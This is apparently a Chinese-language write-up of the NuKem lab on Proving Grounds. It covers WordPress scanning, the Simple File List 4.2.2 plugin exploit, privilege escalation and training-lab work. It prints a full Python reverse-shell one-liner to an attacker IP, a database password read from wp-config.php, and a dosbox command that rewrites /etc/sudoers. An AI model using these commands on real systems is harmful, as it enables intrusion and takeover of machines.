---
title: Proving Grounds Practice-NuKem
date: 2025-6-07 20:00:00
tags: 红队
categories: 红队打靶-Linux
---

# 信息收集

## nmap

![image-20250607161510342](./Nukem/image-20250607161510342.png)

## 80-WordPress

nmap扫描可以得到wordpress 版本

![image-20250607170801110](./Nukem/image-20250607170801110.png)

`wpscan`工具是用来扫描`WordPress`漏洞的，通过wpscan扫描可以得到存在漏洞的插件，主题等

WordPress版本是5.5.1

![image-20250607171120165](./Nukem/image-20250607171120165.png)

主题版本为1.0.1，最新版本为1.5.2

![image-20250607171138972](./Nukem/image-20250607171138972.png)

插件`simple-file-list`最新版本为`6.1.13`当前版本为`4.2.2`

插件`tutor`最新版本为`3.2.3`当前版本为`1.5.3`

![image-20250607171215235](./Nukem/image-20250607171215235.png)

## 5000端口

5000端口扫目录也没有有用信息，只能得到一个后端信息

![image-20250607171822097](./Nukem/image-20250607171822097.png)

## 13000端口

登录信息以`get`方式上传，但好像输入什么都没反应

![image-20250607172023563](./Nukem/image-20250607172023563.png)

# 漏洞利用

## Simple-File-List-4.2.2---Remote-Code-Execution

https://github.com/hermh4cks/Wordpress-Plugin-Simple-File-List-4.2.2---Remote-Code-Execution.git

该插件存在远程代码执行，可以使用现成exp

![image-20250607172851491](./Nukem/image-20250607172851491.png)

运行该exp会上传一个后门，可以访问后门进行命令执行

![image-20250607173005880](./Nukem/image-20250607173005880.png)

## get-shell

可以执行该命令来反弹shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.198",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

![image-20250607173629516](./Nukem/image-20250607173629516.png)

查看`/etc/passwd`中有两个运用bash会话的用户，当前是`http`用户，需要先切换到`commander`用户再进行提权

![image-20250607174054121](./Nukem/image-20250607174054121.png)

在`wp-config.php`中有数据库连接密码，用户正好是`commander`

![image-20250607173947291](./Nukem/image-20250607173947291.png)

```
CommanderKeenVorticons1990
```

使用该密码切换用户可以成功切换

![image-20250607174252671](./Nukem/image-20250607174252671.png)

# 提权

![image-20250607175653955](./Nukem/image-20250607175653955.png)

可以任意文件写入，可以更改`sudoers`中`commander`用户的权限

![image-20250607175807240](./Nukem/image-20250607175807240.png)

```
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander    ALL=(ALL:ALL) ALL >c:$LFILE" -c exit
```

![image-20250607180126927](./Nukem/image-20250607180126927.png)